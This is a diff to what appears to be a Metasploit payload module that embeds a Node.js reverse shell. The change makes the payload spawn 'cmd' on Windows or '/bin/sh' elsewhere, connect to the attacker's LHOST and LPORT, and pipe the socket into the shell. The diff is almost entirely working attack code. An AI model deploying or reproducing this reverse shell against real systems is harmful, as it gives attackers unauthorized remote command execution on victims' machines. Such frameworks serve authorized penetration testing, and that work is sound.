@@ -5,6 +5,10 @@
 #   http://metasploit.com/
 ##
 
+# It would be better to have a commonjs payload, but because the implementations
+# differ so greatly when it comes to require() paths for net modules, we will
+# settle for just getting shells on nodejs.
+
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
@@ -50,10 +54,11 @@ module Metasploit3
 (function(){
   var require = global.require || global.process.mainModule.constructor._load;
   if (!require) return;
+  var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
   var net = require("net"),
-      spawn = require("child_process").spawn,
+      cp = require("child_process"),
       util = require("util"),
-      sh = spawn("/bin/sh", []);
+      sh = cp.spawn(cmd, []);
   var client = this;
   client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", function() {
     client.socket.pipe(sh.stdin);
